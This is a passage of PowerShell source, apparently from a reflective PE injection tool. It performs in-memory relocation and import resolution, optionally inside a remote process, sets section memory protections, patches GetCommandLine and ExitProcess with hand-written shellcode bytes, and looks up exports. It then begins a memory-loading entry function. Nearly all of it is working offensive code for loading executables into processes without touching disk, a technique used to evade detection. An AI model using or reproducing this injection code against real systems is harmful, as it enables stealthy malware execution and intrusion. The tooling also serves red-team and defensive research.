        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }

            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }

                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }

                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )

        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }

        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize

            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )

        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @()

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0

        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8

        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length

        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################

        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################

        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr

        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr

        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }

    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        #Get Win32 constants and functions
